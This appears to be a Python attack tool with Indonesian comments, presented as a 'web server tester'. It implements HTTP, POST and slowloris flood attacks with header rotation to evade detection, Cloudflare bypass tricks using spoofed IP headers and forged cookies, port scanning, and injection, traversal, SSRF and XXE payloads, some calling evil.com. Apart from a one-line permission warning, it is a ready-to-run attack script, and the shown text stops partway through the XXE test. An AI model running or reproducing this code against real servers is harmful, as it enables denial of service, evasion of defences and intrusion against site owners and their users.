import requests
import time
import socket
import ssl
from urllib.parse import urlparse
import concurrent.futures
import sys
import os
import random
import json
import hashlib
from colorama import init, Fore, Style
import threading
import urllib3
import base64
from fake_useragent import UserAgent

# Nonaktifkan peringatan SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Inisialisasi colorama untuk warna di terminal
init(autoreset=True)

class AdvancedWebServerTester:
    def __init__(self, url):
        self.url = url if url.startswith('http') else f'http://{url}'
        self.parsed_url = urlparse(self.url)
        self.results = {}
        self.is_testing = False
        self.ua = UserAgent()
        
        # Advanced headers untuk bypass protection
        self.headers = self.generate_headers()
        self.session = requests.Session()
        self.session.verify = False  # Ignore SSL verification
        
        # Cache untuk performa
        self.cache = {}
        
        # Custom DNS resolver
        self.dns_cache = {}
    
    def generate_headers(self):
        """Generate advanced headers untuk bypass protection"""
        return {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'TE': 'Trailers',
            'DNT': '1' if random.random() > 0.5 else '0',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Pragma': 'no-cache',
        }
    
    def rotate_headers(self):
        """Rotate headers untuk menghindari detection"""
        self.headers = self.generate_headers()
    
    def test_basic_connectivity(self):
        """Tes konektivitas dengan teknik advanced"""
        try:
            print(f"{Fore.CYAN}[*] Menguji koneksi ke {self.url}...")
            
            # Coba multiple methods
            methods = ['GET', 'HEAD', 'OPTIONS']
            success = False
            
            for method in methods:
                try:
                    print(f"{Fore.CYAN}[*] Mencoba method {method}...")
                    start_time = time.perf_counter()
                    
                    if method == 'GET':
                        response = self.session.get(
                            self.url, 
                            headers=self.headers, 
                            timeout=10,
                            allow_redirects=True
                        )
                    elif method == 'HEAD':
                        response = self.session.head(
                            self.url, 
                            headers=self.headers, 
                            timeout=10,
                            allow_redirects=True
                        )
                    elif method == 'OPTIONS':
                        response = self.session.options(
                            self.url,
                            headers=self.headers,
                            timeout=10
                        )
                    
                    response_time = time.perf_counter() - start_time
                    
                    # Cek jika ada Cloudflare protection
                    is_cloudflare = self.detect_cloudflare(response)
                    
                    self.results['basic_connectivity'] = {
                        'status': 'SUCCESS',
                        'status_code': response.status_code,
                        'response_time': f"{response_time:.3f} detik",
                        'method': method,
                        'headers': dict(response.headers),
                        'server': response.headers.get('Server', 'Tidak diketahui'),
                        'cloudflare': is_cloudflare,
                        'content_length': len(response.content) if hasattr(response, 'content') else 0,
                        'final_url': response.url,
                        'redirects': len(response.history) if hasattr(response, 'history') else 0
                    }
                    
                    print(f"{Fore.GREEN}[✓] Method {method} berhasil!")
                    print(f"{Fore.GREEN}[✓] Status Code: {response.status_code}")
                    print(f"{Fore.GREEN}[✓] Response Time: {response_time:.3f}s")
                    print(f"{Fore.GREEN}[✓] Server: {response.headers.get('Server', 'Unknown')}")
                    
                    if is_cloudflare:
                        print(f"{Fore.YELLOW}[!] Cloudflare terdeteksi! Mode bypass diperlukan.")
                    
                    success = True
                    break
                    
                except Exception as e:
                    print(f"{Fore.YELLOW}[!] Method {method} gagal: {str(e)}")
                    continue
            
            if not success:
                raise Exception("Semua method gagal")
            
            return True
            
        except Exception as e:
            self.results['basic_connectivity'] = {
                'status': 'FAILED',
                'error': str(e)
            }
            print(f"{Fore.RED}[✗] Gagal terkoneksi: {str(e)}")
            return False
    
    def detect_cloudflare(self, response):
        """Deteksi Cloudflare protection"""
        headers = response.headers
        server = headers.get('Server', '').lower()
        
        cloudflare_indicators = [
            'cloudflare',
            'cf-ray',
            '__cfduid' in str(response.cookies),
            'cf-cache-status' in headers,
        ]
        
        return any(cloudflare_indicators)
    
    def advanced_stress_test(self, duration=30, concurrent=50, mode='intensive'):
        """Stress test yang sangat agresif dengan multiple teknik"""
        print(f"{Fore.CYAN}[*] Memulai ADVANCED stress test...")
        print(f"{Fore.RED}[!] PERINGATAN: Ini akan MEMBEBANI BERAT server target!")
        print(f"{Fore.RED}[!] Mode: {mode.upper()} | Durasi: {duration}s | Concurrent: {concurrent}")
        
        self.is_testing = True
        stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'start_time': time.perf_counter(),
            'request_times': []
        }
        
        # Prepare attack vectors berdasarkan mode
        attack_vectors = self.prepare_attack_vectors(mode)
        
        def attack_worker(worker_id):
            """Worker untuk melakukan attack"""
            worker_stats = {
                'requests': 0,
                'success': 0,
                'fail': 0
            }
            
            while self.is_testing and (time.perf_counter() - stats['start_time']) < duration:
                try:
                    # Rotate headers setiap beberapa request
                    if worker_stats['requests'] % 5 == 0:
                        self.rotate_headers()
                    
                    # Pilih attack vector secara random
                    attack = random.choice(attack_vectors)
                    
                    # Eksekusi attack
                    start_time = time.perf_counter()
                    
                    if attack['type'] == 'http_flood':
                        success = self.http_flood_attack()
                    elif attack['type'] == 'slowloris':
                        success = self.slowloris_attack()
                    elif attack['type'] == 'post_flood':
                        success = self.post_flood_attack()
                    elif attack['type'] == 'mixed_attack':
                        success = self.mixed_attack()
                    else:
                        success = self.basic_request()
                    
                    response_time = time.perf_counter() - start_time
                    
                    worker_stats['requests'] += 1
                    if success:
                        worker_stats['success'] += 1
                        stats['request_times'].append(response_time)
                    else:
                        worker_stats['fail'] += 1
                    
                    # Dynamic delay untuk menghindari rate limiting
                    delay = random.uniform(0.001, 0.05)
                    time.sleep(delay)
                    
                except Exception as e:
                    worker_stats['fail'] += 1
                    # Jeda kecil jika ada error
                    time.sleep(0.1)
            
            # Update global stats
            stats['total_requests'] += worker_stats['requests']
            stats['successful'] += worker_stats['success']
            stats['failed'] += worker_stats['fail']
        
        # Start workers
        print(f"{Fore.CYAN}[*] Memulai {concurrent} workers...")
        threads = []
        
        for i in range(concurrent):
            t = threading.Thread(target=attack_worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Progress display dengan update real-time
        print(f"\n{Fore.CYAN}[*] Attack sedang berjalan...")
        
        progress_chars = ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷']
        progress_idx = 0
        
        while self.is_testing and (time.perf_counter() - stats['start_time']) < duration:
            elapsed = time.perf_counter() - stats['start_time']
            progress = (elapsed / duration) * 100
            
            # Calculate current RPS
            current_rps = stats['total_requests'] / elapsed if elapsed > 0 else 0
            
            print(f"\r{Fore.CYAN}{progress_chars[progress_idx % len(progress_chars)]} "
                  f"Progress: {progress:.1f}% | "
                  f"Requests: {stats['total_requests']} | "
                  f"RPS: {current_rps:.1f} | "
                  f"Success: {stats['successful']} | "
                  f"Failed: {stats['failed']}", end='')
            
            progress_idx += 1
            time.sleep(0.1)
        
        self.is_testing = False
        total_time = time.perf_counter() - stats['start_time']
        
        # Wait for threads
        for t in threads:
            t.join(timeout=1)
        
        # Calculate final stats
        final_rps = stats['total_requests'] / total_time if total_time > 0 else 0
        success_rate = (stats['successful'] / stats['total_requests']) * 100 if stats['total_requests'] > 0 else 0
        
        # Calculate response time stats
        if stats['request_times']:
            avg_time = sum(stats['request_times']) / len(stats['request_times'])
            min_time = min(stats['request_times'])
            max_time = max(stats['request_times'])
        else:
            avg_time = min_time = max_time = 0
        
        print(f"\n\n{Fore.CYAN}[*] Attack selesai!")
        print(f"{Fore.GREEN}[✓] Total Waktu: {total_time:.2f}s")
        print(f"{Fore.GREEN}[✓] Total Requests: {stats['total_requests']}")
        print(f"{Fore.GREEN}[✓] Requests/Second: {final_rps:.1f}")
        print(f"{Fore.GREEN}[✓] Success Rate: {success_rate:.1f}%")
        print(f"{Fore.GREEN}[✓] Avg Response Time: {avg_time*1000:.1f}ms")
        print(f"{Fore.GREEN}[✓] Min/Max Response: {min_time*1000:.1f}ms / {max_time*1000:.1f}ms")
        
        self.results['advanced_stress_test'] = {
            'status': 'COMPLETED',
            'mode': mode,
            'duration': f"{duration} detik",
            'concurrent': concurrent,
            'total_requests': stats['total_requests'],
            'requests_per_second': f"{final_rps:.1f}",
            'success_rate': f"{success_rate:.1f}%",
            'average_response_time': f"{avg_time*1000:.1f}ms",
            'total_time': f"{total_time:.2f}s",
            'attack_mode': mode
        }
        
        # Impact analysis
        self._analyze_advanced_impact(stats['total_requests'], final_rps, success_rate, avg_time)
        
        return True
    
    def prepare_attack_vectors(self, mode):
        """Siapkan berbagai teknik attack berdasarkan mode"""
        vectors = []
        
        if mode == 'intensive':
            vectors = [
                {'type': 'http_flood', 'weight': 4},
                {'type': 'post_flood', 'weight': 3},
                {'type': 'mixed_attack', 'weight': 2},
                {'type': 'slowloris', 'weight': 1},
            ]
        elif mode == 'dos':
            vectors = [
                {'type': 'http_flood', 'weight': 5},
                {'type': 'mixed_attack', 'weight': 3},
                {'type': 'post_flood', 'weight': 2},
            ]
        elif mode == 'stealth':
            vectors = [
                {'type': 'mixed_attack', 'weight': 3},
                {'type': 'http_flood', 'weight': 2},
                {'type': 'post_flood', 'weight': 1},
            ]
        else:
            vectors = [{'type': 'http_flood', 'weight': 1}]
        
        # Expand based on weight
        expanded_vectors = []
        for vector in vectors:
            expanded_vectors.extend([vector] * vector['weight'])
        
        return expanded_vectors
    
    def http_flood_attack(self):
        """HTTP flood attack dengan variasi"""
        try:
            # Variasi URL dengan parameters
            params = {
                '_': str(int(time.time() * 1000)),
                'cache': str(random.randint(1000, 9999)),
                'rnd': hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
            }
            
            # Random endpoint
            endpoints = ['', '/', '/index.html', '/home', '/api/ping']
            endpoint = random.choice(endpoints)
            target_url = f"{self.url.rstrip('/')}{endpoint}"
            
            response = self.session.get(
                target_url,
                headers=self.headers,
                params=params,
                timeout=3,
                allow_redirects=True
            )
            
            return response.status_code < 500
        except:
            return False
    
    def post_flood_attack(self):
        """POST request flood dengan random data"""
        try:
            # Generate random POST data
            post_data = {
                'timestamp': str(time.time()),
                'data': base64.b64encode(os.urandom(50)).decode()[:100],
                'user_id': random.randint(1, 10000),
                'action': random.choice(['login', 'register', 'search', 'submit']),
                'token': hashlib.sha256(str(time.time()).encode()).hexdigest()[:32]
            }
            
            response = self.session.post(
                self.url,
                headers=self.headers,
                data=post_data,
                timeout=3,
                allow_redirects=False
            )
            
            return response.status_code < 500
        except:
            return False
    
    def slowloris_attack(self):
        """Slowloris attack attempt"""
        try:
            # Create partial connection
            parsed = urlparse(self.url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            if parsed.scheme == 'https':
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=host)
            
            sock.connect((host, port))
            
            # Send partial request
            request = f"POST {parsed.path or '/'} HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            request += "Content-Length: 1000000\r\n"
            request += "\r\n"
            
            sock.send(request.encode())
            
            # Send data slowly
            for i in range(10):
                if not self.is_testing:
                    break
                sock.send(b"X-a: b\r\n")
                time.sleep(1)
            
            sock.close()
            return True
        except:
            return False
    
    def mixed_attack(self):
        """Mixed attack dengan random method"""
        methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE']
        method = random.choice(methods)
        
        try:
            if method == 'GET':
                return self.http_flood_attack()
            elif method == 'POST':
                return self.post_flood_attack()
            elif method == 'HEAD':
                response = self.session.head(self.url, headers=self.headers, timeout=3)
                return response.status_code < 500
            else:
                # Untuk PUT/DELETE, coba dengan data kecil
                data = {'test': 'data'}
                if method == 'PUT':
                    response = self.session.put(self.url, headers=self.headers, data=data, timeout=3)
                else:  # DELETE
                    response = self.session.delete(self.url, headers=self.headers, timeout=3)
                return response.status_code < 500
        except:
            return False
    
    def basic_request(self):
        """Basic request sebagai fallback"""
        try:
            response = self.session.get(self.url, headers=self.headers, timeout=3)
            return response.status_code < 500
        except:
            return False
    
    def _analyze_advanced_impact(self, total_requests, rps, success_rate, avg_response):
        """Analisis dampak advanced attack"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}[*] ANALISIS DAMPAK SERVER")
        print(f"{Fore.CYAN}{'='*60}")
        
        # Analisis berdasarkan metrik
        impact_level = "RENDAH"
        
        if rps > 500:
            impact_level = "SANGAT TINGGI"
            print(f"{Fore.RED}[✗] DAMPAK SANGAT TINGGI: {rps:.0f} RPS")
            print(f"{Fore.RED}    Server kemungkinan mengalami downtime atau slowdown signifikan")
        elif rps > 200:
            impact_level = "TINGGI"
            print(f"{Fore.RED}[✗] DAMPAK TINGGI: {rps:.0f} RPS")
            print(f"{Fore.RED}    Server mengalami beban berat")
        elif rps > 100:
            impact_level = "SEDANG"
            print(f"{Fore.YELLOW}[!] DAMPAK SEDANG: {rps:.0f} RPS")
            print(f"{Fore.YELLOW}    Server terpengaruh tetapi masih beroperasi")
        elif rps > 50:
            impact_level = "RINGAN"
            print(f"{Fore.GREEN}[✓] DAMPAK RINGAN: {rps:.0f} RPS")
            print(f"{Fore.GREEN}    Server menangani beban dengan baik")
        else:
            impact_level = "MINIMAL"
            print(f"{Fore.GREEN}[✓] DAMPAK MINIMAL: {rps:.0f} RPS")
            print(f"{Fore.GREEN}    Server kuat, hampir tidak terpengaruh")
        
        # Analisis success rate
        if success_rate < 50:
            print(f"{Fore.RED}[✗] SUCCESS RATE RENDAH: {success_rate:.1f}%")
            print(f"{Fore.RED}    Banyak request gagal, server mungkin down")
        elif success_rate < 80:
            print(f"{Fore.YELLOW}[!] SUCCESS RATE SEDANG: {success_rate:.1f}%")
            print(f"{Fore.YELLOW}    Server mulai kesulitan merespon")
        
        # Analisis response time
        if avg_response > 1.0:
            print(f"{Fore.RED}[✗] RESPONSE TIME LAMBAT: {avg_response*1000:.0f}ms")
            print(f"{Fore.RED}    Server mengalami latency tinggi")
        elif avg_response > 0.5:
            print(f"{Fore.YELLOW}[!] RESPONSE TIME SEDANG: {avg_response*1000:.0f}ms")
            print(f"{Fore.YELLOW}    Server mulai melambat")
        
        # Simpan impact level
        self.results['advanced_stress_test']['impact_level'] = impact_level
        
        print(f"\n{Fore.CYAN}[*] KESIMPULAN DAMPAK: {impact_level}")
    
    def cloudflare_bypass_test(self):
        """Test bypass Cloudflare protection"""
        print(f"{Fore.CYAN}[*] Mencoba bypass Cloudflare...")
        
        techniques = [
            ("Real Browser Headers", self.cf_real_browser),
            ("IP Rotation Simulation", self.cf_ip_rotation),
            ("JavaScript Challenge", self.cf_js_challenge),
            ("Cookie Manipulation", self.cf_cookie_manipulation),
        ]
        
        results = []
        
        for name, technique in techniques:
            print(f"{Fore.CYAN}[*] Mencoba: {name}...")
            try:
                success, details = technique()
                results.append({
                    'technique': name,
                    'success': success,
                    'details': details
                })
                
                if success:
                    print(f"{Fore.GREEN}[✓] {name}: Berhasil")
                else:
                    print(f"{Fore.YELLOW}[!] {name}: Gagal")
                    
            except Exception as e:
                print(f"{Fore.RED}[✗] {name}: Error - {str(e)}")
                results.append({
                    'technique': name,
                    'success': False,
                    'error': str(e)
                })
        
        self.results['cloudflare_bypass'] = {
            'status': 'COMPLETED',
            'techniques_tested': len(techniques),
            'results': results,
            'successful_techniques': sum(1 for r in results if r['success'])
        }
        
        return any(r['success'] for r in results)
    
    def cf_real_browser(self):
        """Simulasi browser real"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Cache-Control': 'max-age=0',
            }
            
            response = requests.get(self.url, headers=headers, timeout=10, verify=False)
            
            return response.status_code == 200, f"Status: {response.status_code}"
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def cf_ip_rotation(self):
        """Simulasi IP rotation dengan headers"""
        try:
            # Gunakan berbagai X-Forwarded-For IPs
            fake_ips = [
                f"192.168.{random.randint(1,255)}.{random.randint(1,255)}",
                f"10.0.{random.randint(1,255)}.{random.randint(1,255)}",
                f"172.16.{random.randint(1,255)}.{random.randint(1,255)}"
            ]
            
            headers = self.headers.copy()
            headers['X-Forwarded-For'] = random.choice(fake_ips)
            headers['X-Real-IP'] = random.choice(fake_ips)
            headers['CF-Connecting-IP'] = random.choice(fake_ips)
            
            response = requests.get(self.url, headers=headers, timeout=10, verify=False)
            
            return response.status_code == 200, f"IP: {headers['X-Forwarded-For']}, Status: {response.status_code}"
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def cf_js_challenge(self):
        """Coba bypass JS challenge"""
        try:
            # Tambahkan headers yang mungkin diperlukan untuk JS execution
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Referer': self.url,
                'Connection': 'keep-alive',
            }
            
            response = requests.get(self.url, headers=headers, timeout=15, verify=False)
            
            # Cek jika ada challenge page
            if 'challenge' in response.text.lower() or 'cloudflare' in response.text.lower():
                # Coba dengan delay dan retry
                time.sleep(2)
                response = requests.get(self.url, headers=headers, timeout=15, verify=False)
            
            return response.status_code == 200, f"Status: {response.status_code}, Challenge: {'challenge' in response.text.lower()}"
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def cf_cookie_manipulation(self):
        """Manipulasi cookies untuk bypass"""
        try:
            # Request pertama untuk mendapatkan cookies
            response1 = requests.get(self.url, timeout=10, verify=False)
            
            # Buat cookies modified
            cookies = response1.cookies
            
            # Tambahkan atau modifikasi cookies
            modified_cookies = {}
            for cookie in cookies:
                modified_cookies[cookie.name] = cookie.value
            
            # Tambahkan cookie khusus jika ada
            modified_cookies['__cf_bm'] = hashlib.md5(str(time.time()).encode()).hexdigest()
            
            # Request kedua dengan modified cookies
            response2 = requests.get(
                self.url, 
                cookies=modified_cookies,
                headers=self.headers,
                timeout=10,
                verify=False
            )
            
            return response2.status_code == 200, f"Status: {response2.status_code}, Cookies: {len(modified_cookies)}"
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def run_comprehensive_attack(self):
        """Run comprehensive attack dengan semua teknik"""
        print(f"{Fore.RED}{'='*60}")
        print(f"{Fore.RED}[*] KOMPREHENSIF PENETRATION ATTACK")
        print(f"{Fore.RED}{'='*60}")
        
        print(f"{Fore.RED}[!] PERINGATAN: Ini adalah tes penetrasi intensif!")
        print(f"{Fore.RED}[!] Hanya untuk server yang Anda miliki atau dengan izin!")
        
        confirm = input(f"\n{Fore.RED}[?] Konfirmasi untuk melanjutkan (y/n): ")
        if confirm.lower() != 'y':
            print(f"{Fore.YELLOW}[!] Attack dibatalkan")
            return
        
        # Step 1: Deteksi Cloudflare
        print(f"\n{Fore.CYAN}[*] Step 1: Deteksi Perlindungan...")
        self.test_basic_connectivity()
        
        cf_detected = self.results['basic_connectivity'].get('cloudflare', False)
        
        if cf_detected:
            print(f"{Fore.YELLOW}[!] Cloudflare terdeteksi, mencoba bypass...")
            self.cloudflare_bypass_test()
        
        # Step 2: Port Scanning Intensif
        print(f"\n{Fore.CYAN}[*] Step 2: Intensive Port Scanning...")
        self.advanced_port_scan()
        
        # Step 3: Vulnerability Scanning
        print(f"\n{Fore.CYAN}[*] Step 3: Vulnerability Scanning...")
        self.advanced_vulnerability_scan()
        
        # Step 4: Advanced Stress Test
        print(f"\n{Fore.CYAN}[*] Step 4: Advanced Stress Test...")
        duration = int(input(f"{Fore.YELLOW}[?] Durasi attack (detik, default 60): ") or "60")
        concurrent = int(input(f"{Fore.YELLOW}[?] Concurrent connections (default 100): ") or "100")
        
        print(f"\n{Fore.YELLOW}[?] Pilih attack mode:")
        print(f"   1. Intensive (default)")
        print(f"   2. DoS Focus")
        print(f"   3. Stealth")
        
        mode_choice = input(f"{Fore.YELLOW}[?] Pilihan (1-3): ") or "1"
        modes = {1: 'intensive', 2: 'dos', 3: 'stealth'}
        mode = modes.get(int(mode_choice), 'intensive')
        
        self.advanced_stress_test(duration, concurrent, mode)
        
        # Step 5: Generate Report
        print(f"\n{Fore.CYAN}[*] Step 5: Generating Comprehensive Report...")
        self.generate_advanced_report()
        
        print(f"\n{Fore.GREEN}[✓] Comprehensive attack selesai!")
    
    def advanced_port_scan(self):
        """Advanced port scanning dengan service detection"""
        print(f"{Fore.CYAN}[*] Memulai advanced port scan...")
        
        hostname = self.parsed_url.hostname
        port_ranges = [
            (1, 1024),  # Well-known ports
            (1025, 49151),  # Registered ports
            (49152, 65535)  # Dynamic ports
        ]
        
        # Scan well-known ports dengan cepat
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 
                       993, 995, 3306, 3389, 5432, 8080, 8443, 8888, 9000]
        
        open_ports = []
        services = {}
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((hostname, port))
                sock.close()
                
                if result == 0:
                    # Deteksi service
                    service = self.detect_advanced_service(hostname, port)
                    return port, True, service
                return port, False, None
            except:
                return port, False, None
        
        # Scan common ports dengan threading
        with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
            futures = {executor.submit(scan_port, port): port for port in common_ports}
            
            for future in concurrent.futures.as_completed(futures):
                port, is_open, service = future.result()
                if is_open:
                    open_ports.append(port)
                    services[port] = service
                    print(f"{Fore.GREEN}[✓] Port {port} terbuka - {service}")
        
        self.results['advanced_port_scan'] = {
            'status': 'COMPLETED',
            'hostname': hostname,
            'ports_scanned': len(common_ports),
            'open_ports': open_ports,
            'services': services,
            'scan_type': 'common_ports_intensive'
        }
        
        print(f"\n{Fore.CYAN}[*] Port scan selesai!")
        print(f"{Fore.GREEN}[✓] {len(open_ports)} port terbuka dari {len(common_ports)} yang discan")
        
        return open_ports
    
    def detect_advanced_service(self, hostname, port):
        """Advanced service detection"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((hostname, port))
            
            # Send probes based on port
            if port in [80, 8080, 8888, 8000]:
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                
                # Extract server info
                server = "HTTP Server"
                if 'Server:' in banner:
                    server = banner.split('Server:')[1].split('\r\n')[0].strip()
                
                # Check for specific technologies
                techs = []
                if 'Apache' in banner:
                    techs.append('Apache')
                if 'nginx' in banner.lower():
                    techs.append('Nginx')
                if 'IIS' in banner:
                    techs.append('IIS')
                if 'Cloudflare' in banner:
                    techs.append('Cloudflare')
                
                return f"{server} ({', '.join(techs)})" if techs else server
                
            elif port == 22:
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                return f"SSH - {banner[:50]}"
                
            elif port == 21:
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                return f"FTP - {banner[:50]}"
                
            elif port == 25:
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                return f"SMTP - {banner[:50]}"
                
            elif port == 443:
                # Try HTTPS
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                return f"HTTPS - {banner[:50]}"
                
            elif port == 3306:
                return "MySQL"
                
            elif port == 5432:
                return "PostgreSQL"
                
            elif port == 27017:
                return "MongoDB"
                
            elif port == 6379:
                return "Redis"
                
            else:
                # Generic banner grab
                try:
                    sock.send(b"\r\n\r\n")
                    banner = sock.recv(1024).decode('utf-8', errors='ignore')
                    if banner.strip():
                        return f"Unknown - {banner[:50]}"
                except:
                    pass
                
                return "Unknown Service"
                
        except:
            return "Unknown"
    
    def advanced_vulnerability_scan(self):
        """Advanced vulnerability scanning"""
        print(f"{Fore.CYAN}[*] Memulai advanced vulnerability scan...")
        
        vulnerabilities = []
        
        # Common vulnerability tests
        tests = [
            ('SQL Injection', self.test_sql_injection),
            ('XSS', self.test_xss),
            ('Directory Traversal', self.test_directory_traversal),
            ('Command Injection', self.test_command_injection),
            ('File Inclusion', self.test_file_inclusion),
            ('SSRF', self.test_ssrf),
            ('XXE', self.test_xxe),
        ]
        
        for name, test_func in tests:
            print(f"{Fore.CYAN}[*] Testing: {name}...")
            try:
                result = test_func()
                if result['vulnerable']:
                    vulnerabilities.append({
                        'name': name,
                        'details': result['details']
                    })
                    print(f"{Fore.RED}[✗] {name}: VULNERABLE - {result['details']}")
                else:
                    print(f"{Fore.GREEN}[✓] {name}: Secure")
            except Exception as e:
                print(f"{Fore.YELLOW}[!] {name}: Error - {str(e)}")
        
        self.results['vulnerability_scan'] = {
            'status': 'COMPLETED',
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerabilities': vulnerabilities,
            'tests_performed': len(tests)
        }
        
        print(f"\n{Fore.CYAN}[*] Vulnerability scan selesai!")
        print(f"{Fore.GREEN}[✓] {len(vulnerabilities)} vulnerabilities ditemukan")
        
        return vulnerabilities
    
    def test_sql_injection(self):
        """Test SQL Injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR '1'='1'/*",
            "admin'--",
            "admin'#",
            "admin'/*",
        ]
        
        for payload in payloads:
            test_url = f"{self.url}?id={payload}"
            try:
                response = requests.get(test_url, headers=self.headers, timeout=5, verify=False)
                content = response.text.lower()
                
                error_indicators = [
                    'sql syntax',
                    'mysql',
                    'postgresql',
                    'database',
                    'syntax error',
                    'unclosed quotation',
                ]
                
                for indicator in error_indicators:
                    if indicator in content:
                        return {
                            'vulnerable': True,
                            'details': f"SQL Injection dengan payload: {payload}"
                        }
            except:
                pass
        
        return {'vulnerable': False, 'details': ''}
    
    def test_xss(self):
        """Test XSS vulnerabilities"""
        payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '" onmouseover="alert(1)',
            "' onmouseover='alert(1)",
        ]
        
        for payload in payloads:
            test_url = f"{self.url}?q={payload}"
            try:
                response = requests.get(test_url, headers=self.headers, timeout=5, verify=False)
                if payload in response.text:
                    return {
                        'vulnerable': True,
                        'details': f"XSS dengan payload: {payload}"
                    }
            except:
                pass
        
        return {'vulnerable': False, 'details': ''}
    
    def test_directory_traversal(self):
        """Test Directory Traversal vulnerabilities"""
        payloads = [
            '../../../../etc/passwd',
            '..\\..\\..\\..\\windows\\win.ini',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        ]
        
        for payload in payloads:
            test_url = f"{self.url}?file={payload}"
            try:
                response = requests.get(test_url, headers=self.headers, timeout=5, verify=False)
                content = response.text.lower()
                
                if 'root:' in content or '[extensions]' in content:
                    return {
                        'vulnerable': True,
                        'details': f"Directory Traversal dengan payload: {payload}"
                    }
            except:
                pass
        
        return {'vulnerable': False, 'details': ''}
    
    def test_command_injection(self):
        """Test Command Injection vulnerabilities"""
        payloads = [
            '; ls',
            '| ls',
            '`ls`',
            '$(ls)',
            '|| ls',
            '&& ls',
        ]
        
        for payload in payloads:
            test_url = f"{self.url}?cmd=test{payload}"
            try:
                response = requests.get(test_url, headers=self.headers, timeout=5, verify=False)
                content = response.text
                
                # Cek output command
                if 'bin' in content or 'etc' in content or 'usr' in content:
                    return {
                        'vulnerable': True,
                        'details': f"Command Injection dengan payload: {payload}"
                    }
            except:
                pass
        
        return {'vulnerable': False, 'details': ''}
    
    def test_file_inclusion(self):
        """Test File Inclusion vulnerabilities"""
        payloads = [
            'http://evil.com/shell.php',
            'php://input',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',
            'expect://ls',
        ]
        
        for payload in payloads:
            test_url = f"{self.url}?page={payload}"
            try:
                response = requests.get(test_url, headers=self.headers, timeout=5, verify=False)
                content = response.text
                
                if 'phpinfo()' in content or 'PHP Version' in content:
                    return {
                        'vulnerable': True,
                        'details': f"File Inclusion dengan payload: {payload}"
                    }
            except:
                pass
        
        return {'vulnerable': False, 'details': ''}
    
    def test_ssrf(self):
        """Test SSRF vulnerabilities"""
        test_payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost:22',
            'http://127.0.0.1:3306',
            'file:///etc/passwd',
        ]
        
        for payload in test_payloads:
            test_url = f"{self.url}?url={payload}"
            try:
                response = requests.get(test_url, headers=self.headers, timeout=5, verify=False)
                
                # Cek response untuk indikasi SSRF
                if response.status_code != 400 and response.status_code != 500:
                    # Cek content untuk metadata atau service banners
                    content = response.text
                    if 'ami-id' in content or 'MySQL' in content or 'SSH' in content:
                        return {
                            'vulnerable': True,
                            'details': f"SSRF dengan payload: {payload}"
                        }
            except:
                pass
        
        return {'vulnerable': False, 'details': ''}
    
    def test_xxe(self):
        """Test XXE vulnerabilities"""
        xxe_payload = '''<?xml version="1.0"?>
        <!DOCTYPE root [
        <!ENTITY % remote SYSTEM "http://evil.com/xxe">
        %remote;
        ]>
        <root>&data;</root>'''
        
        headers = self.headers.copy()
        headers['Content-Type'] = 'application/xml'
        
        try:
            response = requests.post(
                self.url,
                headers=headers,
                data=xxe_payload,
                timeout=5,
                verify=False
            )
            
            # Cek untuk error messages yang mengindikasikan XXE
            if 'DOCTYPE' in response.text or 'ENTITY' in response.text:
                return {
